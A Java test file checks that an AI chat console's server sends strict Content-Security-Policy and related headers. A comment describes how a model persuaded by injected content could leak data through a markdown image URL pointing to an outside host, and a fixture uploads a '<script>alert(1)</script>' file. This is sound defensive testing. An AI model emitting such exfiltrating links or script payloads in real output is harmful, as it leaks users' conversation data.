package dev.agentkit.chat.web;

import static org.assertj.core.api.Assertions.assertThat;

import dev.agentkit.chat.ChatEvents;
import dev.agentkit.chat.ChatRuntime;
import dev.agentkit.chat.ChatUnavailable;
import dev.agentkit.chat.Conversation;
import dev.agentkit.chat.store.ChatStore;
import dev.agentkit.chat.store.InMemoryChatStore;
import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;

/**
 * The layer that catches the case where the other layers did not.
 *
 * <p>React escapes text, {@code Markdown}'s schema sanitizes what is deliberately markup, and
 * the console's own tests hold both. This is the policy the browser enforces when one of them
 * has a hole: a bug that got markup past the sanitizer still cannot get <em>code</em> past a
 * {@code script-src} that admits nothing inline and nothing from anywhere else.
 *
 * <h2>A policy nobody checks is a header</h2>
 *
 * <p>Two ways a Content-Security-Policy stops being a control. It can be absent — which nothing
 * notices, because the console works perfectly without one. Or it can be present and
 * <em>wrong for the page it is on</em>: a build that starts emitting an inline script would be
 * refused by this policy and the console would come up blank, and the person who added the
 * inline script would take the policy off rather than the script. So this checks both halves —
 * the header is served, and the page it is served with does not need anything the header
 * forbids.
 */
class NothingTheModelWroteCanRunTest {

    private final ChatStore store = new InMemoryChatStore();
    private final ChatEvents events = new ChatEvents();
    private final HttpClient http = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(5)).build();

    private ChatRuntime runtime;
    private ChatServer server;

    private void start() throws IOException {
        runtime = new ChatRuntime(store, events, session -> {
            throw new ChatUnavailable("No model here.");
        });
        server = new ChatServer(0, runtime, "acme", Map::of);
        server.start();
    }

    @AfterEach
    void stop() {
        if (server != null) {
            server.close();
        }
        if (runtime != null) {
            runtime.close();
        }
    }

    private HttpResponse<String> get(String path) throws Exception {
        return http.send(HttpRequest.newBuilder(URI.create(
                        "http://localhost:" + server.port() + path)).GET().build(),
                HttpResponse.BodyHandlers.ofString());
    }

    private static String policy(HttpResponse<?> response) {
        return response.headers().firstValue("Content-Security-Policy").orElse("");
    }

    @Test
    void thePageCarriesAPolicyThatAdmitsNoScriptItDidNotServe() throws Exception {
        start();

        String csp = policy(get("/"));

        assertThat(csp).contains("script-src 'self'");
        assertThat(csp).doesNotContain("script-src 'self' 'unsafe-inline'");
        assertThat(csp).doesNotContain("unsafe-eval");
        // The three that turn a lesser injection into a working one.
        assertThat(csp).contains("object-src 'none'")
                .contains("base-uri 'none'")
                .contains("form-action 'none'");
        // Nobody frames the console, so nobody steals a click on the approval button — which
        // is the one button on this page worth stealing a click for. That is frame-ancestors;
        // frame-src is the other direction and is 'self' so an MCP App's sandboxed srcdoc
        // frame can exist — a frame with an opaque origin that carries its own
        // default-src 'none'.
        assertThat(csp).contains("frame-ancestors 'none'");
        assertThat(csp).contains("frame-src 'self'");
    }

    @Test
    void anImageIsTheExfiltrationChannelAndItIsClosed() throws Exception {
        start();

        // The quiet one. The markdown schema permits http/https image sources, so a model can
        // emit `![](https://elsewhere/?q=…)` and the browser will fetch it — a request that
        // carries whatever the model put in the URL, out of this origin, needing no script and
        // no injection, only a model that was persuaded.
        assertThat(policy(get("/"))).contains("img-src 'self' data:");
        assertThat(policy(get("/"))).contains("connect-src 'self'");
    }

    @Test
    void thePageTheServerActuallyServesDoesNotNeedAnythingThePolicyForbids() throws Exception {
        start();
        String page = get("/").body();

        // A policy the page violates is a policy somebody removes. Vite emits one module tag
        // pointing at this origin and nothing inline; if that ever changes, this fails here
        // rather than as a blank console in front of somebody.
        assertThat(page).contains("<script type=\"module\"");
        assertThat(Pattern.compile("<script(?![^>]*\\bsrc=)").matcher(page).find())
                .as("an inline <script> would be refused by script-src 'self'").isFalse();
        assertThat(Pattern.compile("\\son[a-z]+\\s*=").matcher(page).find())
                .as("an inline event handler would be refused too").isFalse();
        assertThat(page).doesNotContain("javascript:");
        // Same-origin sources only: an absolute src would be refused by the policy above and
        // is also the "no CDN" rule this console keeps for a machine with no internet.
        assertThat(Pattern.compile("(src|href)=\"https?://").matcher(page).find())
                .as("nothing loads from another origin").isFalse();
    }

    @Test
    void everyResponseIsCoveredRatherThanJustThePage() throws Exception {
        start();
        Conversation conversation = store.create("acme", "");

        // An API response is not a page, but it carries somebody else's words and a browser
        // navigated straight at it is a document.
        assertThat(policy(get("/api/conversations"))).contains("default-src 'self'");
        assertThat(get("/api/conversations").headers().firstValue("X-Content-Type-Options"))
                .contains("nosniff");
        assertThat(policy(get("/api/conversations/" + conversation.id())))
                .contains("frame-ancestors 'none'");
        // Including the answer to a request for something that is not there.
        assertThat(policy(get("/api/conversations/nope"))).contains("default-src 'self'");
    }

    @Test
    void anUploadedFileIsInertHoweverItIsServed() throws Exception {
        start();
        Conversation conversation = store.create("acme", "");
        var attachment = store.attach("acme", conversation.id(), "trap.html", "text/html",
                "<script>alert(1)</script>".getBytes(StandardCharsets.UTF_8));

        HttpResponse<String> response = get("/api/attachments/" + attachment.id());

        // Three separate reasons this cannot run as this console: it is not served as HTML, it
        // is served as a download, and it declares a policy that permits nothing at all. The
        // bytes of an uploaded file are the one payload on this server nobody has looked at.
        assertThat(response.headers().firstValue("Content-Type"))
                .contains("application/octet-stream");
        assertThat(response.headers().firstValue("Content-Disposition")).contains("attachment");
        assertThat(response.headers().firstValue("X-Content-Type-Options")).contains("nosniff");
        assertThat(policy(response)).contains("sandbox").contains("default-src 'none'");
    }

    @Test
    void nothingHereIsReadableFromAnotherOrigin() throws Exception {
        start();
        Conversation conversation = store.create("acme", "");

        // No Access-Control-Allow-Origin anywhere. Its absence is what stops another page's
        // JavaScript reading a transcript or an event stream — and adding one "to make local
        // development easier" is precisely how that protection is lost, which is why this
        // asserts on every shape of response rather than on one.
        for (String path : List.of("/", "/api/conversations",
                "/api/conversations/" + conversation.id(),
                "/api/attachments/nope", "/api/nope")) {
            assertThat(get(path).headers().firstValue("Access-Control-Allow-Origin"))
                    .as("%s", path).isEmpty();
        }
    }

    @Test
    void theStreamCarriesThePolicyToo() throws Exception {
        start();
        Conversation conversation = store.create("acme", "");

        // Read the headers and hang up. The stream never ends on its own, so a body handler
        // that waited for it would wait forever.
        HttpResponse<InputStream> response = http.send(
                HttpRequest.newBuilder(URI.create("http://localhost:" + server.port()
                        + "/api/conversations/" + conversation.id() + "/events")).GET().build(),
                HttpResponse.BodyHandlers.ofInputStream());
        try (InputStream body = response.body()) {
            assertThat(response.headers().firstValue("Content-Type"))
                    .contains("text/event-stream; charset=utf-8");
            assertThat(policy(response)).contains("default-src 'self'");
            assertThat(response.headers().firstValue("Access-Control-Allow-Origin")).isEmpty();
        }
    }
}
